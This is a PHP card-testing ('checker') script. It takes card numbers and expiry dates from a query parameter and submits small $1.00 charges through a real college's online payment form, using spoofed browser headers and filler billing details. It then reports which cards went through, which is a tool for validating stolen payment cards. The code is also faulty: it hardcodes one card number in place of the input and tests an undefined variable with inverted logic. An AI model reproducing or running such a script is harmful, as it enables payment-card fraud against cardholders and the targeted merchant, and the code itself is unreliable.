<?php

include('functions/curl.php');
include('functions/getstr.php');
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    $cc = trim(explode("|", $_GET['lista'])[0]);
    $mes = trim(explode("|", $_GET['lista'])[1]);
	$ano = trim(explode("|", $_GET['lista'])[2]);
	
	$a=array("hotmail","gmail","outlook");
    $randmail=array_rand($a, 2);
	
    $response = curl('https://www.nycda.edu/payment-form/', 'input_2.3=asdcsdcsdac&input_2.4=sdcsadcsadc&input_2.6=asdcsadcsadc&input_7=asdcasd343443%40dcjhb.com&input_102=3433333333333&input_103=2-Year+Professional+Training+Programs&input_110.3=1&input_110.1=PTP+Deposits%3A&input_110.2=%240.00&input_111.3=1&input_111.1=Summer+Deposits%3A&input_111.2=%240.00&input_108.5=Other+Amount%7C0&input_88=%241.00&input_107=&input_91=1&input_92.1=5522894771238262&input_92.2%5B%5D=4&input_92.2%5B%5D=2020&input_92.3=+++&input_92.5=adc+dasads&input_101.1=asdcasd4343&input_101.2=asdcsad43432&input_101.3=NewYork&input_101.4=NY&input_101.5=10001&input_101.6=United+States&is_submit_35=1&gform_submit=35&gform_unique_id=5c6b9d9fe41c8&state_35=WyJ7XCIxMTAuMVwiOlwiNjkyNmZhZTljNzAwMGVlMGQ5ODIyNTBhYzk0ZGZiMDhcIixcIjExMC4yXCI6XCIzZTNiOWU4N2ZkNzU3YWFlMTkxY2Y5YjUxMzhhZjc4ZVwiLFwiMTExLjFcIjpcIjA4ODg5NzA3YjVjNjk5MmEyZTg0YWVjZjNmZmY5NzFkXCIsXCIxMTEuMlwiOlwiM2UzYjllODdmZDc1N2FhZTE5MWNmOWI1MTM4YWY3OGVcIixcIjEwOC4xXCI6XCJiM2ZjOWY3YzI3NWM5NjY1OTVlYTU3MDczZmQyZTgzYVwiLFwiMTA4LjJcIjpcImQ0NWIzZjU0OGZkNjU4NjUwOTgwNGQwYTk0MjQzZGU4XCIsXCIxMDguM1wiOlwiNmY1OWMyNGIyNWViYWIzOThmODI5YWQ4OTQyZWE4YTBcIixcIjEwOC40XCI6XCIwMTZiMjc2M2IyNWIwNzFhYjc4ZjdlZTk1ZGQwNTljZVwiLFwiMTA4LjVcIjpcIjgxNzBjOTdlMGRlYjA4ODdhYWQ3ZDk2MGQwMzg0YmUwXCIsXCIxMTIuMVwiOlwiMjBiZDkzNTA0NmViNDg0MmYwYjZiMmM1ZjRmZDgzMDNcIixcIjExMi4yXCI6XCIxOTIwYzU0NTMyN2JkYzNmYzVlMWU3MGE3MzljYzNjMlwiLFwiMTEyLjNcIjpcIjQzMjgzNzU0MzY4OThiODFmYTFkMGFlODM2NzcwNzczXCIsXCIxMTIuNFwiOlwiODE3MGM5N2UwZGViMDg4N2FhZDdkOTYwZDAzODRiZTBcIn0iLCI5NTlkYmQ1ZTZmZjlkOWQ2MTI2ZjZmZmUwY2QxYWQ3NSJd&gform_target_page_number_35=0&gform_source_page_number_35=1&gform_field_values=', array('Host: www.nycda.edu','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Content-Type: application/x-www-form-urlencoded','Referer: https://www.nycda.edu/payment-form/', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'));
    
	
	echo $response;
    if (!strpos($step1, 'Thank you!') !== false ) {
        echo json_encode(array("status" => 0, "msg" => "$cc $mes $ano"));
    } else {
        echo json_encode(array("status" => 1, "msg" => "$cc $mes $ano"));
    }
} else {
    echo "Error";
}